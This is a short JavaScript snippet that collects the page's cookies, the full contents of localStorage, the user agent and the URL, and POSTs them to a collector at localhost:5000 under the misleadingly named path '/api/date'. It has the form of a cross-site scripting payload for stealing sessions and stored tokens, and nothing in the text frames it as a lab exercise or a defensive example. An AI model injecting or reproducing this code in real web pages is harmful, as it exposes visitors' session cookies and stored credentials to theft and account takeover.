fetch('http://localhost:5000/api/date', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    userAgent: navigator.userAgent,
    url: window.location.href,
  }),
});
